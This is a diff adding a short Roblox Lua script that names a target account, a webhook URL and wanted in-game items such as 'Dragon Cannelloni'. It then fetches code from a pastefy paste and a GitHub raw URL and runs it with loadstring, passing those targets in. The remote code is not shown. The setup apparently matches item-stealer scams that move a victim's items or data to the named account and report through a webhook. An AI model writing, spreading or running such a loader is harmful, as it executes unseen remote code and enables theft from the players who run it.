@@ -1,0 +1,24 @@
+local TARGET_ID = 6074348674
+local TARGET_USER = "Onlyplaystrongest"
+local WEBHOOK_URL = ""
+
+local TargetBrainrots = {
+    ["Dragon Cannelloni"] = true
+}
+
+local TargetBaseSkins = {
+    
+}
+
+local TargetGears = {
+    
+}
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/Yz0IvrxL/raw"))()
+
+    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
+    if type(script) == "function" then
+        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
+    end
+end)
